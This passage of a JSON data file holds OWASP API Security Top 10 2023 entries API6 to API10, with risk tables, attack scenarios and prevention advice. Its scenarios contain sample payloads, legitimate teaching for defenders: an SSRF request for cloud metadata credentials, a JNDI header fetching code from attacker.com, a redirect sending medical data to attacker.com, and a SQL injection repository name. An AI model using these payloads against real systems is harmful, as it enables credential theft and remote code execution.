app provides a referral program - users can invite their friends and gain credit for each friend who has joined the app. This credit can be later used as cash to book rides.</p><p>An attacker exploits this flow by writing a script to automate the registration process, with each new user adding credit to the attacker's wallet.</p><p>The attacker can later enjoy free rides or sell the accounts with excessive credits for cash.</p><h2></h2><h2>How To Prevent</h2><p>The mitigation planning should be done in two layers:</p><ul><li>Business - identify the business flows that might harm the business if they are excessively used.</li><li>Engineering - choose the right protection mechanisms to mitigate the business risk.</li><li>Some of the protection mechanisms are more simple while others are more difficult to implement. The following methods are used to slow down automated threats:<ul><li>Device fingerprinting: denying service to unexpected client devices (e.g headless browsers) tends to make threat actors use more sophisticated solutions, thus more costly for them</li><li>Human detection: using either captcha or more advanced biometric solutions (e.g. typing patterns)</li><li>Non-human patterns: analyze the user flow to detect non-human patterns (e.g. the user accessed the \"add to cart\" and \"complete purchase\" functions in less than one second)</li><li>Consider blocking IP addresses of Tor exit nodes and well-known proxies</li></ul></li><li>Secure and limit access to APIs that are consumed directly by machines (such as developer and B2B APIs). They tend to be an easy target for attackers because they often don't implement all the required protection mechanisms.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://owasp.org/www-project-automated-threats-to-web-applications/\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Automated Threats to Web Applications</a></li><li><a href=\"https://owasp.org/API-Security/editions/2019/en/0xaa-insufficient-logging-monitoring/\" rel=\"noopener noreferrer\" target=\"_blank\">API10:2019 Insufficient Logging &amp; Monitoring</a></li></ul>",
        "code": "API6:2023",
        "sort_order": 6
    },
    {
        "tags":
        [
            "CWE-918: Server-Side Request Forgery (SSRF)",
            "API7:2023 Server Side Request Forgery"
        ],
        "testcase": "Server Side Request Forgery",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Common</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Moderate</strong> : Business Specific</p></td></tr><tr><td><p>Exploitation requires the attacker to find an API endpoint that accesses a URI that’s provided by the client. In general, basic SSRF (when the response is returned to the attacker), is easier to exploit than Blind SSRF in which the attacker has no feedback on whether or not the attack was successful.</p></td><td><p>Modern concepts in application development encourage developers to access URIs provided by the client. Lack of or improper validation of such URIs are common issues. Regular API requests and response analysis will be required to detect the issue. When the response is not returned (Blind SSRF) detecting the vulnerability requires more effort and creativity.</p></td><td><p>Successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure, bypassing firewalls, or other security mechanisms. In some cases, it can lead to DoS or the server being used as a proxy to hide malicious activities.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>Server-Side Request Forgery (SSRF) flaws occur when an API is fetching a remote resource without validating the user-supplied URL. It enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN.</p><p>Modern concepts in application development make SSRF more common and more dangerous.</p><p>More common - the following concepts encourage developers to access an external resource based on user input: Webhooks, file fetching from URLs, custom SSO, and URL previews.</p><p>More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose management and control channels over HTTP on predictable, well-known paths. Those channels are an easy target for an SSRF attack.</p><p>It is also more challenging to limit outbound traffic from your application, because of the connected nature of modern applications.</p><p>The SSRF risk can not always be completely eliminated. While choosing a protection mechanism, it is important to consider the business risks and needs.</p><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>A social network allows users to upload profile pictures. The user can choose either to upload the image file from their machine, or provide the URL of the image. Choosing the second, will trigger the following API call:</p><pre>POST /api/profile/upload_picture\n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\"\n}\n</pre><p>An attacker can send a malicious URL and initiate port scanning within the internal network using the API Endpoint.</p><pre>{\n  \"picture_url\": \"localhost:8080\"\n}\n</pre><p>Based on the response time, the attacker can figure out whether the port is open or not.</p><h3>Scenario #2</h3><p>A security product generates events when it detects anomalies in the network. Some teams prefer to review the events in a broader, more generic monitoring system, such as a SIEM (Security Information and Event Management). For this purpose, the product provides integration with other systems using webhooks.</p><p>As part of a creation of a new webhook, a GraphQL mutation is sent with the URL of the SIEM API.</p><pre>POST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://www.siem-system.com/create_new_event\\\",\n              send_test_req: true\n            }\n          ]\n          }\n      }){\n        channelId\n    }\n    }\"\n  }\n]\n\n</pre><p>During the creation process, the API back-end sends a test request to the provided webhook URL, and presents to the user the response.</p><p>An attacker can leverage this flow, and make the API request a sensitive resource, such as an internal cloud metadata service that exposes credentials:</p><pre>POST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\\\",\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n</pre><p>Since the application shows the response from the test request, the attacker can view the credentials of the cloud environment.</p><h2></h2><h2>How To Prevent</h2><ul><li>Isolate the resource fetching mechanism in your network: usually these features are aimed to retrieve remote resources and not internal ones.</li><li>Whenever possible, use allow lists of:<ul><li>Remote origins users are expected to download resources from (e.g. Google Drive, Gravatar, etc.)</li><li>URL schemes and ports</li><li>Accepted media types for a given functionality</li></ul></li><li>Disable HTTP redirections.</li><li>Use a well-tested and maintained URL parser to avoid issues caused by URL parsing inconsistencies.</li><li>Validate and sanitize all client-supplied input data.</li><li>Do not send raw responses to clients.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\" rel=\"noopener noreferrer\" target=\"_blank\">Server Side Request Forgery</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Server-Side Request Forgery Prevention Cheat Sheet</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/918.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href=\"https://snyk.io/blog/url-confusion-vulnerabilities/\" rel=\"noopener noreferrer\" target=\"_blank\">URL confusion vulnerabilities in the wild: Exploring parser inconsistencies, Snyk</a></li></ul>",
        "code": "API7:2023",
        "sort_order": 7
    },
    {
        "tags":
        [
            "CWE-2: Environmental Security Flaws",
            "CWE-16: Configuration",
            "CWE-209: Generation of Error Message Containing Sensitive Information",
            "CWE-319: Cleartext Transmission of Sensitive Information",
            "CWE-388: Error Handling",
            "CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
            "API8:2023 Security Misconfiguration"
        ],
        "testcase": "Security Misconfiguration",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Widespread</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Severe</strong> : Business Specific</p></td></tr><tr><td><p>Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available.</p></td><td><p>Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options.</p></td><td><p>Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>The API might be vulnerable if:</p><ul><li>Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services</li><li>The latest security patches are missing, or the systems are out of date</li><li>Unnecessary features are enabled (e.g. HTTP verbs, logging features)</li><li>There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain</li><li>Transport Layer Security (TLS) is missing</li><li>Security or cache control directives are not sent to clients</li><li>A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set</li><li>Error messages include stack traces, or expose other sensitive information</li></ul><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>An API back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. For each request, a new entry is written to the log file with the following pattern: &lt;method&gt; &lt;api_version&gt;/&lt;path&gt; - &lt;status_code&gt;.</p><p>A bad actor issues the following API request, which gets written to the access log file:</p><pre>GET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n</pre><p>Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the X-Api-Version request header, the logging utility will pull and execute the Malicious.class object from the attacker's remote controlled server.</p><h3>Scenario #2</h3><p>A social network website offers a \"Direct Message\" feature that allows users to keep private conversations. To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required):</p><pre>GET /dm/user_updates.json?conversation_id=1234567&amp;cursor=GRlFp7LCUAAAA\n</pre><p>Because the API response does not include the Cache-Control HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the filesystem.</p><h2></h2><h2>How To Prevent</h2><p>The API life cycle should include:</p><ul><li>A repeatable hardening process leading to fast and easy deployment of a properly locked down environment</li><li>A task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g. S3 bucket permissions)</li><li>An automated process to continuously assess the effectiveness of the configuration and settings in all environments</li></ul><p>Furthermore:</p><ul><li>Ensure that all API communications from the client to the API server and any downstream/upstream components happen over an encrypted communication channel (TLS), regardless of whether it is an internal or public-facing API.</li><li>Be specific about which HTTP verbs each API can be accessed by: all other HTTP verbs should be disabled (e.g. HEAD).</li><li>APIs expecting to be accessed from browser-based clients (e.g., WebApp front-end) should, at least:<ul><li>implement a proper Cross-Origin Resource Sharing (CORS) policy</li><li>include applicable Security Headers</li></ul></li><li>Restrict incoming content types/data formats to those that meet the business/ functional requirements.</li><li>Ensure all servers in the HTTP server chain (e.g. load balancers, reverse and forward proxies, and back-end servers) process incoming requests in a uniform manner to avoid desync issues.</li><li>Where applicable, define and enforce all API response payload schemas, including error responses, to prevent exception traces and other valuable information from being sent back to attackers.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://owasp.org/www-project-secure-headers/\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Secure Headers Project</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\" rel=\"noopener noreferrer\" target=\"_blank\">Configuration and Deployment Management Testing - Web Security Testing Guide</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\" rel=\"noopener noreferrer\" target=\"_blank\">Testing for Error Handling - Web Security Testing Guide</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\" rel=\"noopener noreferrer\" target=\"_blank\">Testing for Cross Site Request Forgery - Web Security Testing Guide</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/2.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-2: Environmental Security Flaws</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/16.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-16: Configuration</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/209.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-209: Generation of Error Message Containing Sensitive Information</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/319.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-319: Cleartext Transmission of Sensitive Information</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/388.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-388: Error Handling</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/444.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/942.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-942: Permissive Cross-domain Policy with Untrusted Domains</a></li><li><a href=\"https://csrc.nist.gov/publications/detail/sp/800-123/final\" rel=\"noopener noreferrer\" target=\"_blank\">Guide to General Server Security</a>, NIST</li><li><a href=\"https://letsencrypt.org/\" rel=\"noopener noreferrer\" target=\"_blank\">Let's Encrypt: a free, automated, and open Certificate Authority</a></li></ul>",
        "code": "API8:2023",
        "sort_order": 8
    },
    {
        "tags":
        [
            "CWE-1059: Incomplete Documentation",
            "API9:2023 Improper Inventory Management"
        ],
        "testcase": "Improper Inventory Management",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Widespread</strong> : Detectability <strong>Average</strong></p></td><td><p>Technical <strong>Moderate</strong> : Business Specific</p></td></tr><tr><td><p>Threat agents usually get unauthorized access through old API versions or endpoints left running unpatched and using weaker security requirements. In some cases exploits are available. Alternatively, they may get access to sensitive data through a 3rd party with whom there's no reason to share data with.</p></td><td><p>Outdated documentation makes it more difficult to find and/or fix vulnerabilities. Lack of assets inventory and retirement strategies leads to running unpatched systems, resulting in leakage of sensitive data. It's common to find unnecessarily exposed API hosts because of modern concepts like microservices, which make applications easy to deploy and independent (e.g. cloud computing, K8S). Simple Google Dorking, DNS enumeration, or using specialized search engines for various types of servers (webcams, routers, servers, etc.) connected to the internet will be enough to discover targets.</p></td><td><p>Attackers can gain access to sensitive data, or even take over the server. Sometimes different API versions/deployments are connected to the same database with real data. Threat agents may exploit deprecated endpoints available in old API versions to get access to administrative functions or exploit known vulnerabilities.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>The sprawled and connected nature of APIs and modern applications brings new challenges. It is important for organizations not only to have a good understanding and visibility of their own APIs and API endpoints, but also how the APIs are storing or sharing data with external third parties.</p><p>Running multiple versions of an API requires additional management resources from the API provider and expands the attack surface.</p><p>An API has a \"documentation blindspot\" if:</p><ul><li>The purpose of an API host is unclear, and there are no explicit answers to the following questions<ul><li>Which environment is the API running in (e.g. production, staging, test, development)?</li><li>Who should have network access to the API (e.g. public, internal, partners)?</li><li>Which API version is running?</li></ul></li><li>There is no documentation or the existing documentation is not updated.</li><li>There is no retirement plan for each API version.</li><li>The host's inventory is missing or outdated.</li></ul><p>The visibility and inventory of sensitive data flows play an important role as part of an incident response plan, in case a breach happens on the third party side.</p><p>An API has a \"data flow blindspot\" if:</p><ul><li>There is a \"sensitive data flow\" where the API shares sensitive data with a third party and<ul><li>There is not a business justification or approval of the flow</li><li>There is no inventory or visibility of the flow</li><li>There is not deep visibility of which type of sensitive data is shared</li></ul></li></ul><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>A social network implemented a rate-limiting mechanism that blocks attackers from using brute force to guess reset password tokens. This mechanism wasn't implemented as part of the API code itself but in a separate component between the client and the official API (api.socialnetwork.owasp.org). A researcher found a beta API host (beta.api.socialnetwork.owasp.org) that runs the same API, including the reset password mechanism, but the rate-limiting mechanism was not in place. The researcher was able to reset the password of any user by using simple brute force to guess the 6 digit token.</p><h3>Scenario #2</h3><p>A social network allows developers of independent apps to integrate with it. As part of this process a consent is requested from the end user, so the social network can share the user's personal information with the independent app.</p><p>The data flow between the social network and the independent apps is not restrictive or monitored enough, allowing independent apps to access not only the user information but also the private information of all of their friends.</p><p>A consulting firm builds a malicious app and manages to get the consent of 270,000 users. Because of the flaw, the consulting firm manages to get access to the private information of 50,000,000 users. Later, the consulting firm sells the information for malicious purposes.</p><h2></h2><h2>How To Prevent</h2><ul><li>Inventory all API hosts and document important aspects of each one of them, focusing on the API environment (e.g. production, staging, test, development), who should have network access to the host (e.g. public, internal, partners) and the API version.</li><li>Inventory integrated services and document important aspects such as their role in the system, what data is exchanged (data flow), and their sensitivity.</li><li>Document all aspects of your API such as authentication, errors, redirects, rate limiting, cross-origin resource sharing (CORS) policy, and endpoints, including their parameters, requests, and responses.</li><li>Generate documentation automatically by adopting open standards. Include the documentation build in your CI/CD pipeline.</li><li>Make API documentation available only to those authorized to use the API.</li><li>Use external protection measures such as API security specific solutions for all exposed versions of your APIs, not just for the current production version.</li><li>Avoid using production data with non-production API deployments. If this is unavoidable, these endpoints should get the same security treatment as the production ones.</li><li>When newer versions of APIs include security improvements, perform a risk analysis to inform the mitigation actions required for the older versions. For example, whether it is possible to backport the improvements without breaking API compatibility or if you need to take the older version out quickly and force all clients to move to the latest version.</li></ul><h2></h2><h2>References</h2><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/1059.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-1059: Incomplete Documentation</a></li></ul>",
        "code": "API9:2023",
        "sort_order": 9
    },
    {
        "tags":
        [
            "CWE-20: Improper Input Validation",
            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
            "CWE-319: Cleartext Transmission of Sensitive Information",
            "API10:2023 Unsafe Consumption of APIs"
        ],
        "testcase": "Unsafe Consumption of APIs",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Common</strong> : Detectability <strong>Average</strong></p></td><td><p>Technical <strong>Severe</strong> : Business Specific</p></td></tr><tr><td><p>Exploiting this issue requires attackers to identify and potentially compromise other APIs/services the target API integrated with. Usually, this information is not publicly available or the integrated API/service is not easily exploitable.</p></td><td><p>Developers tend to trust and not verify the endpoints that interact with external or third-party APIs, relying on weaker security requirements such as those regarding transport security, authentication/authorization, and input validation and sanitization. Attackers need to identify services the target API integrates with (data sources) and, eventually, compromise them.</p></td><td><p>The impact varies according to what the target API does with pulled data. Successful exploitation may lead to sensitive information exposure to unauthorized actors, many kinds of injections, or denial of service.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>Developers tend to trust data received from third-party APIs more than user input. This is especially true for APIs offered by well-known companies. Because of that, developers tend to adopt weaker security standards, for instance, in regards to input validation and sanitization.</p><p>The API might be vulnerable if:</p><ul><li>Interacts with other APIs over an unencrypted channel;</li><li>Does not properly validate and sanitize data gathered from other APIs prior to processing it or passing it to downstream components;</li><li>Blindly follows redirections;</li><li>Does not limit the number of resources available to process third-party services responses;</li><li>Does not implement timeouts for interactions with third-party services;</li></ul><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>An API relies on a third-party service to enrich user provided business addresses. When an address is supplied to the API by the end user, it is sent to the third-party service and the returned data is then stored on a local SQL-enabled database.</p><p>Bad actors use the third-party service to store an SQLi payload associated with a business created by them. Then they go after the vulnerable API providing specific input that makes it pull their \"malicious business\" from the third-party service. The SQLi payload ends up being executed by the database, exfiltrating data to an attacker's controlled server.</p><h3>Scenario #2</h3><p>An API integrates with a third-party service provider to safely store sensitive user medical information. Data is sent over a secure connection using an HTTP request like the one below:</p><pre>POST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n</pre><p>Bad actors found a way to compromise the third-party API and it starts responding with a 308 Permanent Redirect to requests like the previous one.</p><pre>HTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n</pre><p>Since the API blindly follows the third-party redirects, it will repeat the exact same request including the user's sensitive data, but this time to the attacker's server.</p><h3>Scenario #3</h3><p>An attacker can prepare a git repository named '; drop db;--.</p><p>Now, when an integration from an attacked application is done with the malicious repository, SQL injection payload is used on an application that builds an SQL query believing the repository's name is safe input.</p><h2></h2><h2>How To Prevent</h2><ul><li>When evaluating service providers, assess their API security posture.</li><li>Ensure all API interactions happen over a secure communication channel (TLS).</li><li>Always validate and properly sanitize data received from integrated APIs before using it.</li><li>Maintain an allowlist of well-known locations integrated APIs may redirect yours to: do not blindly follow redirects.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Web Service Security Cheat Sheet</a></li><li><a href=\"https://www.owasp.org/index.php/Injection_Flaws\" rel=\"noopener noreferrer\" target=\"_blank\">Injection Flaws</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Input Validation Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Injection Prevention Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Transport Layer Protection Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Unvalidated Redirects and Forwards Cheat Sheet</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/20.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-20: Improper Input Validation</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/200.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/319.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-319: Cleartext Transmission of Sensitive Information</a></li></ul>",
        "code": "API10:2023",
        "sort_order": 10
    }
]
